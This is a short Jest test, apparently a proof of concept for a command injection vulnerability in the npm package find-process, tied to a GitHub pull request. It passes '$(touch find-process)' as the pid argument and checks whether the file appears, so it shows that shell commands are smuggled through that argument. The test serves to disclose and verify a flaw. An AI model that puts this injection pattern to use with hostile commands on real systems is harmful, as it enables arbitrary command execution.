//https://github.com/yibn2008/find-process/pull/44
test("Command Injection in find-process", () => 
{
	const find = require('find-process');
	const fs = require('fs')
	const path = './find-process'
	const command = "$(touch find-process)";

	find('pid', command);


	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);
});
